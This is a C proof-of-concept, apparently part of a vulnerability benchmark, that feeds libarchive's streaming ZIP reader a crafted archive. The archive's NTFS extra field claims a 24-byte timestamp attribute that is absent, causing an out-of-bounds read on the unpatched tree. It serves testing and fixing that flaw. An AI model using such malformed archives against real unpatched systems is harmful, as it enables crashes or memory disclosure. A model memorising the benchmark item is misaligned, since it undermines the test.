/*
 * Standalone PoC for the benchmark harness.
 *
 * Exercises libarchive's public streaming ZIP reader on a single local
 * file header whose 0x000A "NTFS" extra field declares a Tag 1 / Size 24
 * attribute block (Mtime/Atime/Ctime FILETIMEs) but the archive ends
 * immediately after that 4-byte Tag/Size pair -- no 24 bytes of attribute
 * data actually follow it anywhere in the buffer.
 *
 * Build: cc -fsanitize=address,undefined -I<repo>/libarchive -g -O0 \
 *          pocs/residual.c -L<build>/libarchive -larchive -o residual
 * Run:   LD_LIBRARY_PATH=<build>/libarchive ./residual
 */
#include <archive.h>
#include <archive_entry.h>
#include <stddef.h>

static const unsigned char zip_data[] = {
/* --- local file header --- */
	0x50, 0x4b, 0x03, 0x04, /* local file header signature */
	0x14, 0x00,             /* version needed to extract: 2.0 */
	0x00, 0x00,             /* general purpose bit flag */
	0x00, 0x00,             /* compression method: stored */
	0x00, 0x00,             /* last mod file time */
	0x21, 0x00,             /* last mod file date */
	0x00, 0x00, 0x00, 0x00, /* CRC-32 (unused: entry has no data) */
	0x00, 0x00, 0x00, 0x00, /* compressed size = 0 */
	0x00, 0x00, 0x00, 0x00, /* uncompressed size = 0 */
	0x05, 0x00,             /* file name length = 5 */
	0x24, 0x00,             /* extra field length = 36 */
	0x61, 0x2e, 0x74, 0x78, 0x74, /* "a.txt" */
/* extra field 0x000a "NTFS" (36 bytes total) */
	0x0a, 0x00,             /* extra field ID = 0x000a */
	0x20, 0x00,             /* extra field size = 32 */
	0x00, 0x00, 0x00, 0x00, /* reserved */
	0x63, 0x00,             /* attribute tag = 99 (unrecognized) */
	0x14, 0x00,             /* attribute size = 20 */
	0x00, 0x00, 0x00, 0x00, /* 20 bytes of filler attribute data ... */
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, /* ... */
	0x01, 0x00,             /* attribute tag = 1 (Mtime/Atime/Ctime) */
	0x18, 0x00,             /* attribute size = 24 (claimed) */
	/* The archive ends right here: no FILETIME bytes follow the
	 * Tag 1 / Size 24 header anywhere in this buffer. */
};

int
main(void)
{
	struct archive *a;
	struct archive_entry *ae;

	a = archive_read_new();
	if (a == NULL)
		return (1);
	archive_read_support_format_zip_streamable(a);
	if (archive_read_open_memory(a, zip_data, sizeof(zip_data)) != ARCHIVE_OK)
		return (1);
	/* On the shipped tree, this walks past the end of zip_data while
	 * decoding the claimed-but-absent Tag 1 attribute. On the golden
	 * tree the length check correctly rejects the truncated
	 * attribute and this call returns cleanly (ARCHIVE_OK or a
	 * file-format error), without reading out of bounds. */
	archive_read_next_header(a, &ae);
	archive_read_free(a);
	return (0);
}
